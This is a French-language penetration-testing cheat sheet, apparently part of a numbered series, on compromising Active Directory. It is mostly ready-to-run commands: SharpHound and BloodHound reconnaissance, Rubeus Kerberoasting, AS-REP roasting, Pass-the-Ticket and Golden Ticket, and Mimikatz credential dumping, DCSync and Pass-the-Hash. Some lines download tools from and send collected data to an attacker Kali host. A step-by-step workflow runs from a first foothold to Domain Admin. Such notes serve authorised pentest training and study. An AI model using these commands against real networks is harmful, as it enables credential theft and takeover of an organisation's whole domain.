# 08 — Active Directory

> Référence : https://wadcoms.github.io

---

## Contexte — ce qu'on cherche sur un AD

```
Utilisateurs        → comptes actifs, admins, service accounts
Groupes             → Domain Admins, Enterprise Admins, membres
ACL / ACE           → qui a des droits sur quoi
Kerberos            → tickets exploitables (TGT, TGS)
Chemins d'attaque   → suite de droits menant à Domain Admin
```

---

## BloodHound / SharpHound

### Objectif
Cartographier l'AD et trouver le chemin le plus court vers Domain Admin.

### 1. Collecter les données — SharpHound (sur la cible Windows)

```powershell
# Télécharger SharpHound sur la cible
Invoke-WebRequest -Uri http://[IP_KALI]:8080/SharpHound.exe -OutFile C:\Temp\SharpHound.exe

# Collecte complète
.\SharpHound.exe -c All

# Collecte ciblée — sessions et ACL uniquement
.\SharpHound.exe -c Session,ACL

# Résultat : un fichier .zip généré dans le dossier courant
```

### 2. Récupérer le fichier zip

```bash
# Depuis Kali — lancer un serveur SMB pour récupérer le zip
impacket-smbserver share . -smb2support

# Sur la cible Windows
copy C:\Temp\20240101_BloodHound.zip \\[IP_KALI]\share\
```

### 3. Lancer BloodHound (sur Kali)

```bash
# Démarrer Neo4j
sudo neo4j start

# Lancer BloodHound
bloodhound &

# Credentials par défaut Neo4j
# user : neo4j | pass : neo4j (changer au premier lancement)
```

### 4. Importer le zip
```
BloodHound → Upload Data → sélectionner le .zip
```

### 5. Requêtes clés dans BloodHound

```
Analysis → Find Shortest Path to Domain Admins
Analysis → Find all Domain Admins
Analysis → Find Principals with DCSync Rights
Analysis → Shortest Path from Owned Principals
Analysis → Find AS-REP Roastable Users
Analysis → Find Kerberoastable Users
```

### 6. Marquer ses accès

```
Clic droit sur un utilisateur/machine → Mark as Owned
→ BloodHound recalcule les chemins depuis tes accès
```

---

## Rubeus — Attaques Kerberos

### Kerberoasting — extraire des tickets de service

```powershell
# Lister les comptes Kerberoastables
.\Rubeus.exe kerberoast /stats

# Extraire les tickets (hashcat format)
.\Rubeus.exe kerberoast /outfile:C:\Temp\hashes.txt

# Cracker avec hashcat
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

### AS-REP Roasting — comptes sans pré-auth Kerberos

```powershell
# Lister les comptes vulnérables
.\Rubeus.exe asreproast /stats

# Extraire les hashes
.\Rubeus.exe asreproast /outfile:C:\Temp\asrep.txt

# Cracker avec hashcat
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### Pass-the-Ticket

```powershell
# Lister les tickets Kerberos en mémoire
.\Rubeus.exe triage

# Extraire un ticket (base64)
.\Rubeus.exe dump /luid:[LUID] /service:krbtgt

# Injecter un ticket dans la session courante
.\Rubeus.exe ptt /ticket:[base64_ticket]

# Vérifier l'injection
klist
```

### Golden Ticket (si tu as le hash KRBTGT)

```powershell
.\Rubeus.exe golden /rc4:[HASH_KRBTGT] /domain:[DOMAIN] /sid:[DOMAIN_SID] /user:Administrator /ptt
```

---

## Mimikatz — extraction de credentials

> Nécessite des droits administrateur local ou SYSTEM.

### Dump des credentials en mémoire

```cmd
# Lancer Mimikatz
.\mimikatz.exe

# Obtenir les droits nécessaires
privilege::debug
token::elevate

# Extraire les mots de passe en clair (si disponibles)
sekurlsa::logonpasswords

# Extraire les hashes NTLM uniquement
sekurlsa::msv

# Extraire les tickets Kerberos
sekurlsa::tickets
```

### DCSync — extraire les hashes depuis le DC

```cmd
# Simuler une réplication DC pour extraire les hashes
# Nécessite : DCSync rights (Domain Admin ou délégation)
lsadump::dcsync /domain:[DOMAIN] /user:Administrator
lsadump::dcsync /domain:[DOMAIN] /all /csv
```

### Pass-the-Hash

```cmd
# Ouvrir un shell avec un hash NTLM
sekurlsa::pth /user:Administrator /domain:[DOMAIN] /ntlm:[HASH] /run:cmd.exe
```

### Dump du fichier SAM (local)

```cmd
lsadump::sam
```

---

## Workflow AD — du foothold au Domain Admin

```
1. Foothold sur une machine du domaine
        ↓
2. SharpHound → collecter les données AD
        ↓
3. BloodHound → identifier le chemin vers Domain Admin
        ↓
4. Kerberoasting / AS-REP Roasting → cracker des comptes
        ↓
5. Mimikatz → extraire credentials ou tickets en mémoire
        ↓
6. Pass-the-Hash / Pass-the-Ticket → accès latéral
        ↓
7. DCSync → extraire le hash KRBTGT → Golden Ticket
        ↓
8. Domain Admin ✓
```

---

## Commandes de vérification utiles (CMD/PowerShell natif)

```powershell
# Infos sur le domaine
net user /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain

# Infos sur la machine
systeminfo | findstr /i "domain"

# Contrôleur de domaine
nltest /dclist:[DOMAIN]
nslookup -type=SRV _ldap._tcp.[DOMAIN]
```
